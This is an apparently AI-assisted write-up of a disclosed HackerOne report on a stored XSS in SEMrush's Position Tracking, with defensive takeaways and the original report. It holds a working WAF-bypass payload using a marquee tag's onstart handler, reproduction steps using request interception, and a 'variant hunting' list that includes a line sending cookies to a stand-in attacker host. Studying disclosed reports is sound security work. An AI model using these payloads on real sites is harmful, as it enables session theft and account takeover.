# Stored XSS in Position Tracking with WAF Bypass via Unusual HTML Tags

## Metadata
- **Source:** HackerOne
- **Report:** 382625 | https://hackerone.com/reports/382625
- **Submitted:** 2018-07-17
- **Reporter:** jimgogogo
- **Program:** SEMrush
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), WAF Bypass, Client-Side Validation Bypass, Improper Input Sanitization
- **CVEs:** None
- **Category:** web-api

## Summary
A Stored XSS vulnerability was discovered in SEMrush's Position Tracking feature where competitor domain input was validated only client-side and inadequately sanitized server-side. The attacker bypassed both client-side validation and the application's WAF using an uncommon HTML payload with marquee tag and onstart event handler that wasn't included in the blacklist.

## Attack scenario
1. Attacker logs into SEMrush account and creates a project with Position Tracking enabled
2. Attacker navigates to Dashboard > Position Tracking > Rankings Distribution and selects 'Edit competitor's list'
3. Attacker enters a valid domain initially to pass client-side validation, then intercepts the request with Burp Suite
4. Attacker modifies the domain parameter with malicious payload: "><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
5. Attacker submits the request, and the WAF fails to block the payload due to reliance on HTML tag/attribute blacklist missing marquee and onstart combinations
6. When other users or the attacker views the Position Tracking page, the stored XSS executes and exfiltrates session cookies or performs account compromise

## Root cause
Multiple security failures: (1) Client-side only validation allowing bypass via interception, (2) Server-side input sanitization using incomplete blacklist approach rather than whitelist, (3) WAF rules not covering all HTML elements and event handlers (specifically marquee tag with onstart attribute), (4) Lack of output encoding/escaping when rendering stored data

## Attacker mindset
The attacker demonstrated persistence in finding edge-case payloads not covered by the WAF blacklist. Rather than attempting common XSS vectors, they systematically tested uncommon HTML elements and attribute combinations to identify gaps in the filter rules. This suggests knowledge of WAF evasion techniques and testing methodology.

## Defensive takeaways
- Implement server-side input validation as primary defense; never rely solely on client-side validation
- Use whitelist-based sanitization rather than blacklist approach for HTML content filtering
- Apply context-aware output encoding (HTML entity encoding) when rendering user-supplied data
- Maintain comprehensive WAF rules covering all HTML5 elements and event handlers, not just common ones
- Implement Content Security Policy (CSP) headers to mitigate XSS impact even if payload executes
- Use security-focused templating engines that auto-escape by default
- Regular security testing including fuzzing with uncommon HTML elements to identify WAF gaps
- Implement automated sanitization libraries (e.g., DOMPurify, OWASP Java HTML Sanitizer) rather than custom filtering

## Variant hunting
Test other uncommon HTML5 elements: details, summary, dialog tags with event handlers
Try case variation and encoding bypasses: <MaRqUeE>, %3Cmarquee%3E, &#60;marquee&#62;
Test other event handlers with marquee: onload, onerror, onmouseover in combination with marquee
Check if other input fields in competitor domain management have same vulnerability
Test similar functionality in other SEMrush features (backlink analysis, keyword tracking, etc.)
Attempt payload injection in other user-editable fields with domain/URL inputs
Try SVG-based XSS vectors: <svg onload> or <svg><animate>
Test data exfiltration via img tag: <img src=x onerror='fetch(attacker.com?c='+document.cookie)'>
Check if stored XSS can be escalated to CSRF or account takeover via cookie theft

## MITRE ATT&CK
- T1190
- T1598
- T1566
- T1204
- T1539
- T1499

## Notes
The report demonstrates that WAF evasion is often possible when using blacklist-based approaches. The attacker's use of marquee (an obsolete but valid HTML element) with onstart (a less-common event handler) shows the importance of comprehensive filtering. The vulnerability chain (client-side validation bypass + incomplete server-side filtering + WAF blacklist gap) created a critical impact. SEMrush likely patched this by implementing proper sanitization libraries and whitelist-based filtering rather than blacklist-based approaches.

## Full report
<details><summary>Expand</summary>

## Summary 
   Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. 

## Description 
   I have found this Stored XSS in 'position tracking' of [SEMrush](http://semrush.com) website.
first I setup 'position tracking' then in 'Rankings Distribution' tab add a valid domain in competitor's domain field which is check the validation just in client side so I try to hook it via BurpSuit and change the domain parameter to my XSS payload, as I see it saved my payload completely but by the time it wants to show me, my payload must have passed through the website Firewall so there is nothing to show.
As I guess the Firewall probably uses blacklist that controls just the HTTP/GET method so Although it blocked lots of HTML tags and attributes but I try hard and bypass it after all as shown in Figures  F321488 and F321489.
in conclusion, there is a WAF bypass vulnerability besides the XSS that may cause of effects in other vulnerabilities happening.

## Browsers Verified In
   Mozilla 5.0 Firefox 52.0 ESR

## Steps To Reproduce
   1. Log in to your account.
   2. Create project.
   3. Navigate to Dashboard-> Position Tracking ->Rankings Distribution -> select one of add domains -> click on "Edit competitor's list"
    4. Fill 'new competitor's domain' field with a valid domain like google.com then open BurpSuit for changing the domain parameter with the payload below then click on "Add to list"
```"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS```

  Note: lots of tags and attributes are blocked by the firewall but this rare payload isn't blocked so far and works correctly as shown in Figure F321486.
   5. After changing the domain parameter click on 'Update' button then close "Position Tracking Settings" page.
    6. And shown in Figure F321490 after closing the "Position Tracking Settings" page the XSS is loaded.

## Supporting Material/References:

{F321488}
{F321489}
{F321486}
{F321490}

https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)

## Impact

The attacker can have the session and cookie of customers and deface that page.
The firewall that uses blacklist is bypassed by the special payload.

</details>

---
*Analysed by Claude on 2026-05-12*
